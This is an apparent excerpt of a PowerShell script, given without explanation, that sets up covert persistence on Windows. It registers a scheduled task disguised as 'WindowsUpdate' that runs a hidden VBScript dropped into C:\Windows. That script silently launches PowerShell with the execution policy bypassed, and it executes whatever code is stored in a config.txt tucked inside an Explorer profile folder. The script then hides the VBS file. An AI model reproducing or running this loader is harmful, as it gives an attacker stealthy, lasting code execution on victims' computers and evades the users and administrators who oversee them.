...
schtasks /create  /TN WindowsUpdate /TR 'C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Initialize.vbs' /sc onidle /i 20
New-Item 'C:\Windows\Initialize.txt' -type file -force
Add-Content C:\Windows\Initialize.txt "Dim objShell`r`nSet objShell = WScript.CreateObject( ""WScript.Shell"" )`r`ncommand = ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile Invoke-Command -ScriptBlock {Get-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt | Invoke-Expression}"" `r`nobjShell.Run command,0`r`nSet objShell = Nothing"
Rename-Item C:\Windows\Initialize.txt Initialize.vbs
Set-ItemProperty -Path C:\Windows\Initialize.vbs -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
